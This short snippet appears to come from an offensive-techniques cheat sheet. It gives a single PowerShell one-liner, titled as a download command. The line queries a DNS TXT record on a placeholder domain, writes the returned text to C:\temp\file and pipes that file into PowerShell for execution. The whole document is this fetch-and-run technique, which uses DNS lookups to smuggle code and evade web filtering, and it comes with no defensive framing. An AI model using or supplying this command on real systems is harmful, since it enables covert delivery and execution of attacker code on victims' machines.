### Download command using nslookup and DNS TXT records
```
$s=echo (nslookup -q=txt <subdomain>.<domain>.<tld>)[-1].Trim();$s.SubString(1,$s.Length-2)>C:\temp\file;type C:\temp\file|powershell
```

